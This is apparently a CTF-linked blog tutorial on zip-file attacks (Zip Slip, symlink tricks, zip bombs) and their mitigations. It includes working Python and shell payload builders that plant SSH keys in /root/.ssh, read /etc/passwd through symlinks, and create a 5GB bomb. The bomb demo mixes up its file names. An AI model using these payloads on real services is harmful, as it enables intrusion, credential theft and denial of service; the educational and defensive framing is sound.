---
title: "From Compression to Compromise: Unmasking Zip File Threats"
excerpt: Deep dive into zip file attacks and mitigations (with examples!).
tags: 
  - notes
  - web
  - python
  - programming
  - tutorial
  - ctf
  - linux
  - windows
thumbnail_src: assets/thumbnail.jpg
tocOptions: '{"tags":["h2","h3","h4"]}'
preamble: |
  *Last month, I designed a CTF challenge involving zip file attacks. This post is a collection of the techniques, insights, and notes I've gathered. I've also uploaded the challenge on [GitHub](https://github.com/TrebledJ/attack-of-the-zip) along with a simplified playground.*
---

Zip files are *everywhere* in our daily lives, seamlessly integrated into our personal, academic, and professional environments. From Java apps to Microsoft Office documents, zip files have become an indispensable tool.

But as we know from *Silicon Valley*, zip files have the potential to be dangerous.

{% image "assets/yikes-its-a-zip-bomb.jpg", "w-80", "Filmmakers' impression of a zip bomb." %}
<sup>YouTube: [Silicon Valley - The Ultimate Hack](https://www.youtube.com/watch?v=jnDk8BcqoR0)</sup>{.caption}

In this post, we'll delve into the intriguing world of zip file attacks, exploring various attacks and mitigations involving zip files. These attacks allow attackers to potentially gain unauthorised file read/write privileges—or even cause denial of service. This calls for mitigations to bolster our systems’ defences.

The discussion will primarily centre around attacks on Linux/Unix, although considerations for Windows are also included.

{% alert "danger" %}
Disclaimer: The content provided in this blog post is intended purely for educational purposes. The author does not assume any responsibility for the potential misuse of the information presented herein. Readers are advised to exercise caution and utilise the knowledge gained responsibly and within legal boundaries.
{% endalert %}

## Zip Attacks

{% image "assets/evil-zip-unveiled.jpg", "w-50", "Fred dissects evil zip files. Spoofy-spoofy doo!" %}

### Zip Slip ⛸

#### Overview of Zip Slip

**Zip Slip** is a fancy name for [directory traversal](https://cwe.mitre.org/data/definitions/22.html) but applied to zip uploads. The idea is to *escape* a directory by visiting parent directories through `../` (or `..\` on Windows). By exploiting the lack of filename validation, Zip Slip enables us to perform arbitrary file writes.

Let's look at an example.

A typical zip file may look like this:

```text
foo.zip
└── data1.csv
└── data2.txt
└── ...
```

But in a Zip Slip payload, files are prefixed with nasty double-dots (`../`). As an example, we'll try to overwrite SSH keys by writing to `/root/.ssh/authorized_keys`.

```text
evil-slip.zip
└── placeholder.txt
└── ../../root/.ssh/authorized_keys
```

(Note: `placeholder.txt` has been included as a control variable, i.e. to show what happens normally to files.)

Most decompression applications will refuse to unpack such a zip. But vulnerable ones would gladly accept it and overwrite SSH keys on their system.

Suppose a vulnerable application unzips `evil-slip.zip` to `/app/uploads/`. The unzipped `authorized_keys` file would end up in `/app/uploads/../../root/.ssh/authorized_keys`, i.e. `/root/.ssh/authorized_keys`.

```text
/
├── app/
│	└── uploads/
│	    └── placeholder.txt
└── root/
    └── .ssh/
		└── authorized_keys
```
<sup>Result of unzipping `evil-slip.zip`. Note that `placeholder.txt` resides in the unzip directory, while `authorized_keys` has sneaked its way into `/root/.ssh/`.</sup>{.caption}

{% alert "fact" %}
Overwriting `~/.ssh/authorized_keys` is a common arbitrary file write vector which can be applied in other file upload scenarios too! (See [*this MITRE reference*](https://attack.mitre.org/techniques/T1098/004/).)

This isn't the only way to gain arbitrary code execution. There are other potential targets for an arbitrary file write (server credentials, config files, cron jobs, etc.).
{% endalert %}

#### DIY: Build your own Zip Slip payload!

{% details "With Python" %}
Python's built-in `zipfile` module provides a convenient way to create zip files.

```python
import zipfile

with zipfile.ZipFile("evil-slip.zip", "w") as zip:
    zip.write("my-ssh-key.pub", "../../root/.ssh/authorized_keys")
    #          │                 └ filename to store on the archive
    #          └ file to compress from our local file system
```

This creates a new `evil-slip.zip` zip file. After importing the `zipfile` module, we create an instance with the desired file name (`evil-slip.zip`) and use write-mode (`"w"`). (There is also `r` and `a` for reading/adding files.)

We also use Python's `with` statement, so that the zip file automatically saves when leaving the block, whether due to normal or erroneous circumstances.

Inside, we use `zip.write` to add files to the zip. We add a local file `my-ssh-key.pub` and store it as `../../root/.ssh/authorized_keys` in the archive.

One nice thing about the `zipfile` module is that it constructs the file *in-memory* (without creating temporary files). This allows us to craft complex zips without trashing our local filesystem.

{% enddetails %}

{% details "With Shell Commands" %}
Another approach is to use shell commands and reverse the process: start with the files we want unzipped.

```shell
$ touch ../../root/.ssh/authorized_keys
# Normally we would run `ssh-keygen` to generate a key pair...
# and use the generated public key as our authorized_keys.
# But let's assume ../.ssh/authorized_keys holds a public key.

$ zip evil-slip ../../root/.ssh/authorized_keys
  adding: ../../root/.ssh/authorized_keys (deflated 18%)
  
$ unzip -l evil-slip
Archive:  evil-slip.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      575  01-23-2024 17:53   ../../root/.ssh/authorized_keys
---------                     -------
      575                     1 file
```

{% enddetails %}

#### Limitations of Zip Slip

- On Windows, you may need backslashes `\` instead of forward slashes `/`. This ultimately depends on the unzipping application/library. Some libraries will convert between slashes.
- The app needs execute permissions on intermediate folders (to traverse across) and write permissions on the target folder.
  For instance, to write to `foo/bar/baz/flag.txt`, we need `x` permissions on `foo/` and `foo/bar/`; and `wx` permissions on `foo/bar/baz/`.

### Zip Symlink Attacks 🖇

Zip symlink attacks are just that: zip file attacks containing symlinks (symbolic links). There are several ways to build such a malicious zip, but let's first clarify two types of symlinks in our arsenal:

1. Symlink Files. This allows us to potentially *read* arbitrary files.
2. Symlink Directories. This allows us to potentially *write files* to arbitrary folders.

Why “potential”? Because there are other factors that may hinder such attacks: OS permissions, {% abbr "WAFs", "web application firewalls" %}, etc.

#### Arbitrary File Read with File Symlinks

Let's start with a simple zip symlink payload. Here's a zip which contains a symlink to `/etc/passwd`.

```text
evil-link-file.zip
└── passwd.txt         -> /etc/passwd
```

Suppose (again) a vulnerable app unzips this file at `/app/uploads/`. The filesystem would now resemble:

```text
app/
└── uploads/
	└── passwd.txt     -> /etc/passwd
```

If we can read files in `/app/uploads/`, then we can read `passwd.txt` and by extension, `/etc/passwd`![^really-by-extension] We can use this method to read any file on the system (subject to certain constraints to be discussed later).

[^really-by-extension]: Okay, some steps were skipped here for the sake of simplicity. The long answer is: reading a symlink also depends on permissions of the {% abbr "source file", "the file linked by the symlink" %} and the {% abbr "source directory", "the directory containing the source file" %}. ***If*** we can read files in our upload directory **and** if we have sufficient permissions, then we can (potentially) have arbitrary file read. See [Limitations](#limitations-of-zip-symlink-attacks).

This is all fine and dandy if we can read files in `/app/uploads/`. But... what if can't?

One solution is to find a readable directory, then deploy the symlink *into that directory* with Zip Slip. But let's look at another way to achieve the same result...

#### Arbitrary File Write with Dir Symlinks

Although Zip Slip does allow us to perform arbitrary file writes, `..` patterns may be (naively) filtered or blocked. An alternative is to use directory symlinks.

Again, let's try to write a file to `/root/.ssh/authorized_keys`.

Instead of using one zip entry, we'll use two: a directory and a file.

```text
evil-link-dir.zip
└── dirlink/           -> /root/.ssh/
    └── authorized_keys
```

These two entries are:

- `dirlink`: a symlink to our target directory
- `dirlink/authorized_keys`: the file we're trying to write

Now our zip contains a symlink directory! Let's go through what happens when this file is unzipped by a vulnerable app.

First, `dirlink` is decompressed and a symlink is created, pointing to `/root/.ssh/`. Next, the app tries to decompress `dirlink/authorized_keys`, which—if the app follows symlinks—gets written to `/root/.ssh/`.

Tada! We've just shown another way to achieve arbitrary file write.

Let's see what the filesystem looks like now.

```text
/
├── app/
│	└── uploads/
│	    └── dirlink        -> /root/.ssh/
└── root/
    └── .ssh/
		└── authorized_keys
```

{% alert "success" %}
**Put it into Practice**: If you're itching to try out Zip Slip and zip symlink attacks, feel free to try the [exercises I've uploaded on GitHub](https://github.com/TrebledJ/attack-of-the-zip).
{% endalert %}


#### DIY: Build your own Zip Symlink Payload!

{% details "With Python" %}
Like before, we can use Python to generate zip symlink payloads. We'll need some extra massaging with `ZipInfo` though.

```python
# evil-link-file.zip
# └── passwd.txt         -> /etc/passwd
with zipfile.ZipFile("evil-link-file.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
  # This creates a file symlink named `passwd.txt` which links to `/etc/passwd`.
  info = zipfile.ZipInfo("passwd.txt")
  info.create_system = 0 # Linux => 0. Windows => 3.
  info.external_attr = (stat.S_IFLNK | 0o777) << 16 # File attributes.
  zip.writestr(info, "/etc/passwd")  # /etc/passwd is the file we want to read.
```

To construct a dir symlink attack, we change the path in `zip.writestr` to a directory. We also use `zip.write` to add a source file.

```python
# evil-link-dir.zip
# └── dirlink/           -> /root/.ssh/
#     └── authorized_keys
with zipfile.ZipFile("evil-link-dir.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
  info = zipfile.ZipInfo("dirlink")
  info.create_system = 0
  info.external_attr = (stat.S_IFLNK | 0o777) << 16
  zip.writestr(info, "/root/.ssh/")

  # Add an file from our filesystem. (Not a symlink.)
  zip.write("my-ssh-key.pub", "dirlink/authorized_keys")
```

For a double symlink attack (file symlink + dir symlink), we just combine the two methods and create two symlinks.

```python
# evil-link-dir.zip
# └── dirlink/           -> /some/readable/directory/
#     └── passwd.html    -> /etc/passwd
with zipfile.ZipFile("evil-link-dir-file.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
  # Order matters! Write dir first, then file.
  info = zipfile.ZipInfo("dirlink")
  info.create_system = 0
  info.external_attr = (stat.S_IFLNK | 0o777) << 16
  zip.writestr(info, "/some/readable/directory/")

  info = zipfile.ZipInfo("dirlink/passwd.html")
  info.create_system = 0
  info.external_attr = (stat.S_IFLNK | 0o777) << 16
  zip.writestr(info, "/etc/passwd")
```

{% enddetails %}

{% details "With Shell Commands" %}
Shell commands also work. (Make sure to use `-y`/`--symlinks` when zipping symlinks. Otherwise, you'd be adding your actual `/etc/passwd`!)

Double symlink payload construction:

```sh
# Create our (soft) links.
ln -s /some/readable/directory/ dirlink
ln -s /etc/passwd dirlink/passwd.txt
# Zip the links. (Order matters!)
zip -y evil-link-dir-file dirlink dirlink/passwd.txt
```

Note that this approach will leave leftover files.
{% enddetails %}

#### Limitations of Zip Symlink Attacks

- Permissions on Linux.
  - To create a symlink, we need execute permissions in the source directory (where the linked file is located) and write/execute permissions in the target directory (where the symlink is created).[^ref-linuxlinkperm]
  - Reading a symlink requires execute permissions in the source directory, and read permissions on the source file.
- Permissions on Windows. By default, only Administrators have the privilege to [create symbolic links](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-symbolic-links). This setting can be changed by [editing the local group policy](https://superuser.com/a/105381) or by directly enabling `SeCreateSymbolicLinkPrivilege`.
- Although symlink attacks are cool and all, they're relatively rare (in the wild) compared to Zip Slip. Perhaps symlinks are handled with extra care.

[^ref-linuxlinkperm]: Reference: [SO: Minimum Permissions Required to Create a Link to a File](https://stackoverflow.com/questions/40667014/linux-what-are-the-minimum-permissions-required-to-create-a-link-to-a-file)


### Zip Bombs 💣

Since we're talking about attacks, let's also cover zip bombs for completeness.

Zip bombs are designed to cripple computers, systems, and virus scanners (rather than read sensitive data or escalate privileges, like Zip Slip and symlink attacks). Much like the well-memed [fork bomb](https://en.wikipedia.org/wiki/Fork_bomb), a zip bomb attempts to drain system resources.

{% images "h-auto" %}
{% image "https://i.redd.it/68j4sr9h3dg21.jpg" %}
{% image "https://img.devrant.com/devrant/rant/r_674011_CfdZB.jpg" %}
{% image "assets/unzip42.jpg" %}
{% endimages %}

<sup>Some fork bomb memes. And zip bomb memes adapted from fork bomb memes. Zip bomb memes where?^[There probably aren't as many memes on zip bombs as they tend to be a software bug which can be swiftly patched.]</sup>
{.caption}

The basic principle abuses the ***deflate***[^deflate] compression format to achieve compression ratios of up to [1032:1](https://stackoverflow.com/a/16794960/10239789). This means after compression, every byte of compressed data can represent *up to* 1032 bytes of *uncompressed* data.

Zip bombs approach this ratio by compressing a file with highly-repetitive patterns (e.g. all zeros) which can be counted and grouped compactly.

{% details "Why are highly-repetitive patterns 'easier to compress'?" %}
To see why repetitive patterns facilitate compression, consider an analogy with run-length encoding. If we want to compress `1111222233334444`, we would say `four 1s, four 2s, four 3s, four 4s` which has a compression ratio of 12 characters to 8 words. But if we want to compress `1111111111111111`, we would say `twelve 1s`, which has a higher compression ratio of 12 characters to *2* words.
{% enddetails %}

[^deflate]: This is the same compression algorithm used in gzip (commonly used for transferring files across the web) and PNGs.

The well-known [42.zip](https://www.unforgettable.dk/) bomb is only 42KB, but contains 5 layers of zips upon zips. Unzipping the first layer yields a harmless 0.6MB. But recursively uncompressed, it yields an astronomical payload of {% abbr "4.5PB (petabytes, 15 zeros)", "4,503,599,626,321,920 bytes, to be exact" %}!

Most decompression tools and virus scanners are wary of zip bombs, and only unzip the first (few) layers or stop after identifying a zip file.
 
In 2019, David Fifield introduced *a better zip bomb*, which abuses the structure of a .zip, toying with metadata to trick decompressors into puking ungodly amounts of data.[^fifield] A 42KB, compressed Fifield zip bomb yields 5.4GB of uncompressed bytes. This is just the first level of decompression! This metadata trickery is more generally known as **Metadata Spoofing**.

[^fifield]: Fifield's article on "a better zip bomb": *https://www.bamsoftware.com/hacks/zipbomb/*. (It may be blocked on some browsers.)

#### DIY: Build your own Zip Bomb!

Here's a small demo on a Linux shell:
```sh
# Create a blank file with 5GB of null bytes.
$ dd if=/dev/zero bs=20000 count=250000 >zero.txt

# Zip it.
$ zip test.zip test.txt

# Count the number of bytes.
$ wc -c zero.txt zero.zip
 5000000000 zero.txt
 4852639 zero.zip
 5004852639 total
```

From 5GB, we've gone down to ~4.9MB! A few of these could exhaust most virtual machines.


## Zip Vulnerabilities in the Wild

Here are some notable zip vulnerabilities in the past decade:

- [Multiple Zip Vulnerabilities across Flutter and Swift Packages](https://blog.ostorlab.co/zip-packages-exploitation.html) (2023)
- [Zip Symlink Vulnerability in Juce](https://vulners.com/prion/PRION:CVE-2021-23521) (2021)
- [Zip Slip](https://www.cvedetails.com/cve/CVE-2018-1000544) (2018) and [Metadata Spoofing](https://www.cvedetails.com/cve/CVE-2019-16892/) (2019) in Rubyzip
- [Zip Slip Bonanza in Multiple Languages/Frameworks/Packages](https://github.com/snyk/zip-slip-vulnerability) (2018 - 2019)

Keep in mind zip files come in different forms. Here are some you might be familiar with:
- .docx, .pptx, .xlsx (Microsoft Documents),
- .jar (Java Archive),
- .apk (Android App),
- .mscx (MuseScore File).

Any service processing such files has potential to be vulnerable.


## Mitigations and Other Considerations

{% image "https://csis-website-prod.s3.amazonaws.com/s3fs-public/publication/171212_cyber_Defense.jpg", "w-40 floatr1", "Credit: Cybrain/Adobe Stock" %}

So much for the offensive side. How about the defensive aspect? What approaches can we take to secure our systems?

Let's explore a few ways to mitigate zip attacks. (Some of these can also be applied to protect against other attacks, or may just be general improvements.)

### Permissions
*For sysadmins.*

{% image "assets/you-guys-apply-hardening-question-mark.jpg", "w-60", "Input sanitisation? Never heard of it!" %}

{% alert "success" %}
1. Avoid running applications as `root` or `Administrator`. Instead, run it with a minimum privilege user.

  Minimum meaning: enough permissions to get the job done, and only enabling higher permissions when needed. Typically, only read/write are needed. Maybe write permissions for log/upload directories.
{% endalert %}

In America, "all men are created equal". Not so in filesystems.

Reading, writing, and linking files depends on permissions. Setting appropriate permissions for the process and limiting the scope of an application can go a long way in preventing attackers from snooping secrets.

See [Limitations of Zip Slip](#limitations-of-zip-slip) and [Limitations of Zip Symlink Attacks](#limitations-of-zip-symlink-attacks) for details on relevant permissions.


### Modern Antivirus
*For sysadmins and normies.*

{% alert "success" %}
2. Upgrade your (antivirus) software. Daily updates to malware signatures ensure your antivirus program stays equipped to detect and thwart emerging threats.
{% endalert %}

Although zip bombs have targeted antivirus (AV) systems in the past, most [modern AV programs can detect zip bombs](https://www.microsoft.com/en-us/windows/learning-center/what-is-a-zip-bomb#:~:text=most%20modern%20antivirus%20programs%20are%20able%20to%20find) by recognising patterns and signatures.


### Robust Code
*For software developers **building/maintaining** zip applications/libraries.*

{% alert "success" %}
3. Consider the nature of your application/library and handle edge cases. Prevent attack vectors where applicable.

{% endalert %}

Although `/../` and symlinks can be used maliciously, they are technically allowed by the zip specification[^zip-spec]. So... should your product implement protections against these? It depends.

[^zip-spec]: Reference: [PKWare Mirror](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)

- Are you developing an unzip application (for end-users) or a high-level unzip library (to be conveniently imported and used by application developers)?
	- Then **yes**, you should prevent the aforementioned tricks entirely.
- Are you developing a low-level unzip library, closely following the zip spec?
	- Then **not necessarily**, but you should play your part by using secure defaults where possible. The responsibility now falls on developers using your library to respect the defaults and assess potential risk.

{% details "Code: Malicious Actors Hate This One Simple Trick!" %}
One common way to prevent arbitrary file write attacks is to:

1. resolve the canonical path of the target file,^[Canonical path means no `./`, no `../`, no `~/`, no symlinks. Just a directory built directly from `/`.] and
2. verify the path is within the unzip directory.

For instance, Juce v6.1.5 [added such a check](https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R438-R440):

```cpp
if (!fileToUnzip.isAChildOf(directoryToUnzipTo))
  // Attack attempt detected: attempted write outside of unzip directory.
  return Result::fail("...");
```

{% enddetails %}

{% details "Attack Vectors and Edge Cases to Consider" %}
*For high-level unzip libraries and applications.*

Checklist of edge cases to consider.

- `..` (Zip Slip),
- symlinks (zip symlink attacks),
- potential uncompressed file size (especially if your application targets end-users or constrained systems).

{% enddetails %}

{% details "Good Defaults" %}
*For all unzip libraries and applications.*

- Don't follow symlink directories.
- Don't overwrite files. You don't want your existing files wiped out, right?

It's a good idea to keep these defaults, unless you really need these features, and you're confident with the level of risk you're dealing with.

{% enddetails %}

### Unit Tests
*For software developers **building/maintaining** zip libraries.*

{% alert "success" %}
4. Adopt unit testing to verify your code works as intended. Add test cases against unintended situations.
{% endalert %}

Test cases prevent [software regression](https://en.wikipedia.org/wiki/Software_regression) and automate the menial task of manual input. For example, Juce v6.1.5 also introduced a [test case against Zip Slip](https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R700).

## tl;dr

A quick recap:

- There are generally three streams of zip attacks:
  - Arbitrary File Write with Zip Slip
  - Arbitrary File Read/Write with Zip Symlink Attacks
  - Denial of Service with Zip Bombs and Metadata Spoofing
- Ways to counter zip attacks include:
  - (Sysadmins) Run applications with a *minimum-privilege* user.
  - (Regular Users, Sysadmins) Regularly update antiviruses with new signatures.
  - (Software Developers) Adopt strong software development practices, including error handling, secure defaults, and unit tests.

While zip files offer convenience and efficiency in compressing and sharing data, we shouldn't overlook the security implications they can present. Hopefully this article left the reader with some understanding of their potential risks.

*Anecdotes? Stories? New zip developments? Let me know by leaving a comment.* 🙂

## References

- [PentesterAcademy: From Zip Slip to System Takeover](https://blog.pentesteracademy.com/from-zip-slip-to-system-takeover-8564433ea542)
- [SecurityVault: Attacks with Zip Files and Mitigations](https://thesecurityvault.com/attacks-with-zip-files-and-mitigations/)
